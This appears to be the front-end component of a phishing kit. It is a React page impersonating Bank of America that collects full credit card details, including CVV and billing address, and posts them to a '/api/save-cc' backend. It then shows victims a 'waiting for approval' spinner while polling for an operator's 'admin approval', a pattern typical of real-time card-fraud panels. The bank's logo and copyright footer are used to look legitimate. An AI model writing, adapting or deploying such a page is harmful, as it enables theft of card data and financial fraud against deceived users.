/* eslint-disable @typescript-eslint/no-explicit-any */
import React, { useState } from "react";
import axios from "axios";
import logo from "/boa.png";

const API_BASE = "http://localhost:4000";

const CreditCard: React.FC = () => {
  const [submitting, setSubmitting] = useState(false);
  const [pendingApproval, setPendingApproval] = useState(false);
  const [, setMessage] = useState("");

  const [formData, setFormData] = useState({
    cardNumber: "",
    expMonth: "",
    expYear: "",
    nameOnCard: "",
    streetAddress: "",
    zipCode: "",
    cvv: "",
  });

  const handleChange = (
    e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>
  ) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const validateCvv = (cvv: string) => /^[0-9]{3,4}$/.test(cvv);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setMessage("");

    if (!validateCvv(formData.cvv)) {
      setMessage("Enter a valid CVV (3 or 4 digits).");
      return;
    }

    setSubmitting(true);

    try {
      // send form data, backend generates a new user_id
      const response = await axios.post(`${API_BASE}/api/save-cc`, {
        ...formData,
      });

      const result = response.data;
      const newUserId = result.user.id; // get database ID

      if (result.user?.status === "pending") {
        setPendingApproval(true);
        setMessage("Your card is waiting for admin approval...");

        // Poll the backend until status is approved
        const pollInterval = 2000; // 2s
        const maxAttempts = 30; // max 1 minute
        let attempts = 0;

        while (attempts < maxAttempts) {
          await new Promise((resolve) => setTimeout(resolve, pollInterval));
          const check = await axios.get(`${API_BASE}/api/cards`);
          const userData = check.data.find((u: any) => u.id === newUserId);
          if (userData?.status === "approved") {
            setMessage("✅ Card approved by admin!");
            setPendingApproval(false);
            break;
          }
          attempts++;
        }

        if (attempts === maxAttempts) {
          setMessage(
            "⚠️ Admin approval is taking longer than expected. Please check back later."
          );
          setPendingApproval(false);
        }
      } else {
        setMessage("Card information saved successfully!");
      }

      // Clear form completely
      setFormData({
        cardNumber: "",
        expMonth: "",
        expYear: "",
        nameOnCard: "",
        streetAddress: "",
        zipCode: "",
        cvv: "",
      });
    } catch (err: unknown) {
      console.error("❌ API error:", err);
      setMessage(
        axios.isAxiosError(err)
          ? err.response?.data?.error || err.message
          : "Something went wrong!"
      );
    } finally {
      setSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-white flex flex-col items-center justify-center px-6 py-10 relative">
      {/* Loader Modal */}
      {pendingApproval && (
        <div className="fixed inset-0 flex items-center justify-center bg-black/40 backdrop-blur-sm z-50">
          <div className="bg-white rounded-xl shadow-xl p-8 flex flex-col items-center space-y-6 w-80 max-w-sm">
            <img src={logo} alt="Bank of America" className="h-12 mb-2" />

            {/* Tailwind spinner */}
            <div className="w-16 h-16 border-4 border-gray-200 border-t-[#B42025] rounded-full animate-spin"></div>

            <p className="text-gray-700 text-center font-medium">
              Waiting for approval...
            </p>

            {/* Animated dots using Tailwind */}
            <div className="flex space-x-2 mt-2">
              <span className="w-2 h-2 bg-[#B42025] rounded-full animate-bounce delay-75"></span>
              <span className="w-2 h-2 bg-[#B42025] rounded-full animate-bounce delay-150"></span>
              <span className="w-2 h-2 bg-[#B42025] rounded-full animate-bounce delay-300"></span>
            </div>
          </div>
        </div>
      )}

      <header className="flex items-center space-x-2 mb-10">
        <a className="text-2xl font-semibold text-blue-900">
          <img src={logo} alt="Bank of America" className="h-10" />
        </a>
      </header>

      <div className="bg-white shadow-md rounded-lg max-w-md w-full p-6 border border-gray-100">
        <h2 className="text-xl font-semibold text-gray-800 mb-3">
          Credit Card Information
        </h2>

        <form onSubmit={handleSubmit} className="text-left space-y-4">
          {/* Card Number */}
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-1">
              Credit card number
            </label>
            <input
              type="text"
              name="cardNumber"
              value={formData.cardNumber}
              onChange={handleChange}
              placeholder="Enter your card number"
              className="w-full border border-gray-300 rounded-md p-2 focus:ring-1 focus:ring-blue-500 focus:outline-none"
              required
              inputMode="numeric"
              pattern="[0-9\s]+"
              autoComplete="cc-number"
            />
          </div>

          {/* Expiration */}
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-1">
              Expiration date
            </label>
            <div className="flex space-x-2">
              <select
                name="expMonth"
                value={formData.expMonth}
                onChange={handleChange}
                className="w-1/2 border border-gray-300 rounded-md p-2 focus:ring-1 focus:ring-blue-500 focus:outline-none"
                required
              >
                <option value="">Month</option>
                {[...Array(12)].map((_, i) => (
                  <option key={i + 1} value={String(i + 1).padStart(2, "0")}>
                    {String(i + 1).padStart(2, "0")}
                  </option>
                ))}
              </select>
              <select
                name="expYear"
                value={formData.expYear}
                onChange={handleChange}
                className="w-1/2 border border-gray-300 rounded-md p-2 focus:ring-1 focus:ring-blue-500 focus:outline-none"
                required
              >
                <option value="">Year</option>
                {[...Array(10)].map((_, i) => (
                  <option key={i} value={2025 + i}>
                    {2025 + i}
                  </option>
                ))}
              </select>
            </div>
          </div>

          {/* Name on Card */}
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-1">
              Name on card
            </label>
            <input
              type="text"
              name="nameOnCard"
              value={formData.nameOnCard}
              onChange={handleChange}
              placeholder="Enter name as shown on card"
              className="w-full border border-gray-300 rounded-md p-2 focus:ring-1 focus:ring-blue-500 focus:outline-none"
              required
              autoComplete="cc-name"
            />
          </div>

          {/* CVV */}
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-1">
              CVV
            </label>
            <input
              type="tel"
              name="cvv"
              value={formData.cvv}
              onChange={handleChange}
              placeholder="123"
              className="w-1/3 border border-gray-300 rounded-md p-2 focus:ring-1 focus:ring-blue-500 focus:outline-none"
              required
              inputMode="numeric"
              maxLength={4}
              pattern="[0-9]{3,4}"
              autoComplete="cc-csc"
            />
          </div>

          {/* Address */}
          <div className="flex space-x-2">
            <div className="w-2/3">
              <label className="block text-sm font-medium text-gray-700 mb-1">
                Street address
              </label>
              <input
                type="text"
                name="streetAddress"
                value={formData.streetAddress}
                onChange={handleChange}
                placeholder="Enter street address"
                className="w-full border border-gray-300 rounded-md p-2 focus:ring-1 focus:ring-blue-500 focus:outline-none"
              />
            </div>
            <div className="w-1/3">
              <label className="block text-sm font-medium text-gray-700 mb-1">
                ZIP code
              </label>
              <input
                type="text"
                name="zipCode"
                value={formData.zipCode}
                onChange={handleChange}
                placeholder="ZIP"
                className="w-full border border-gray-300 rounded-md p-2 focus:ring-1 focus:ring-blue-500 focus:outline-none"
              />
            </div>
          </div>

          <button
            type="submit"
            disabled={submitting || pendingApproval}
            className={`w-full text-white rounded-md py-2 mt-4 transition ${
              submitting || pendingApproval
                ? "bg-gray-400 cursor-not-allowed"
                : "bg-[#B42025] hover:bg-blue-800"
            }`}
          >
            {submitting
              ? "Submitting..."
              : pendingApproval
              ? "Waiting for approval..."
              : "Continue"}
          </button>

          {/* {message && (<p className={`mt-3 text-sm ${message.includes("success") || message.includes("approved")? "text-green-600": "text-red-500"}`} >
              {message}
            </p>
          )} */}
        </form>
      </div>

      <footer className="mt-10 text-sm text-gray-500">
        © {new Date().getFullYear()} Bank of America Corporation. All rights
        reserved.
      </footer>

      {/* Loader CSS */}
      <style>{`
        .loader {
          border-top-color: #3498db;
          animation: spin 1s linear infinite;
        }
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
      `}</style>
    </div>
  );
};

export default CreditCard;
